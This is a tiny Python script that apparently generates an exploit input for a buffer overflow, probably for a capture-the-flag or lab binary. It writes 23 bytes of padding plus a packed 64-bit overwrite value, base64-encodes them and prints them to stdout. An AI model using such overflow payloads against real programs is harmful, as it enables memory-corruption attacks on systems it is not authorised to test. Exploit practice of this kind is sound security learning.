
import sys
import struct
import base64

buf = b'LLLLLLLLLLLLLLLLLLLLLLL'
buf += struct.pack('<Q', 14257735287936902493)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
